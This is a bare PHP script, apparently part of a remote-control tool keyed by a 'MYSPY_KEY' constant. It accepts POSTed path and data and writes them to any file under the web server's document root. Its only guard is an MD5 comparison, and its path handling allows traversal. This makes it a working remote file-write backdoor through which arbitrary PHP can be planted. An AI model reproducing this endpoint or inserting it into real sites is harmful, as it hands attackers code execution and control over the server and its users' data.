<?php
	
	include('config.php');
	
	if(MD5($_POST['random'].MYSPY_KEY) == $_POST['code'])
	{
		$file = fopen($_SERVER['DOCUMENT_ROOT'].'/'.preg_replace("/^.+(\.(pl|com|org|net|es))+\//", '', $_POST['path']), 'w');
		fwrite($file, rawurldecode($_POST['data']));
		fclose($file);
		
		echo '1';
	}
	else echo '0';
	
?>